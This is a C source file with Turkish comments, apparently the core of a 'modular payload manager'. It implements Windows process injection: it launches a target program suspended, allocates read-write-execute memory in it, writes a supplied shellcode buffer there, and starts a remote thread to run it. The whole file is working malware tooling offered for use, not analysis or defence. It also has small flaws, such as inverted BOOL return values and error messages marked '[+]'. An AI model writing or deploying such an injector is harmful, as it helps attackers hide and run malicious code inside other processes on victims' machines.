//injector.c Mikail'in moduler payload yoneticisinin temeli
#include <Windows.h>
#include<stdio.h>
#include "injector.h"

//Payload enjeksiyonfonksiyonu
BOOL inject_payload(LPCSTR targetPath, unsigned char* payload, SIZE_T payloadSize) {
	STARTUPINFOA si = { sizeof(si) }; // Process başlatma bilgilerini tutar
	PROCESS_INFORMATION pi;          // Başlatılan process hakkında bilgi tutar   

	//1.Process'i suspend modda başlat(askıya alınmış) modda
	if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[+] CreateProcessA başarısız :%lu\n", GetLastError());
		return 1;
	}

	//2.Hedef processin belleginde payload için yer ayır
	LPVOID remoteMem = VirtualAllocEx(
		pi.hProcess,                  //Hedef process
		NULL,                         // Otomatik adres seçimi
		payloadSize,                 // Ayrılacak boyut    
		MEM_COMMIT | MEM_RESERVE,    // Bellek ayırma tipi
		PAGE_EXECUTE_READWRITE       // Bellek izinleri:yazılabilit ve çalıştırılabilir  
	);
	if (!remoteMem) {
		printf("[+]VistualAllocxEx hata:%lu\n", GetLastError());
		return 1;
	}

	//3.Shellcode'u hedef processin belleginde yaz
	
	if (!WriteProcessMemory(pi.hProcess, remoteMem, payload, payloadSize, NULL)) {
		printf("[+] WriteProcessMemory hata: %lu\n", GetLastError());
		TerminateProcess(pi.hProcess, 1); //Hedef process'i sonlandır.
		return 1;
	}

	//4.Yazılan shellcode adresinden yeni bir thread başlat
	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
	if (!hThread) {
		printf("[+] CreateRemoteThread hata:%lu\n", GetLastError());
		TerminateProcess(pi.hProcess, 1);
		return 1;
	}

	//5.Orijinal thread'i başlat (istege baglı)
	ResumeThread(pi.hThread);

	//Temizlik
	CloseHandle(hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);


	printf("[+] Enjelsiyon başarılı\n");
	return 0;



}
